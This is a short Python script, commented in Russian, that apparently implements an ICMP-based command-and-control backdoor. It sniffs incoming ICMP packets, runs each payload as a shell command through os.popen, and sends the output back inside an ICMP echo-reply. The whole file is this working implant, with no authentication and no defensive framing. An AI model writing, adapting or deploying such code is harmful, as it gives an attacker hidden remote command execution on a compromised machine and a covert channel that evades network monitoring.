#!/usr/bin/env python3
#encoding: utf8
import os
from scapy.all import *
def main():
    while True:
        # ждём от C2-сервера ICMP-сообщение с командой
        rx = sniff(filter="icmp", count=1)
        # извлекаем из пакета полезную нагрузку
        var = rx[0][Raw].load.decode('utf-8')
        # запускаем команду и сохраняем результат
        res = os.popen(var).read()
        # создаём ICMP-пакет с результатом в качестве полезной нагрузки
        send(IP(dst="localhost")/ICMP(type="echo-reply", id=0x0001, seq=0x1)/res)
if __name__ == "__main__":
    main()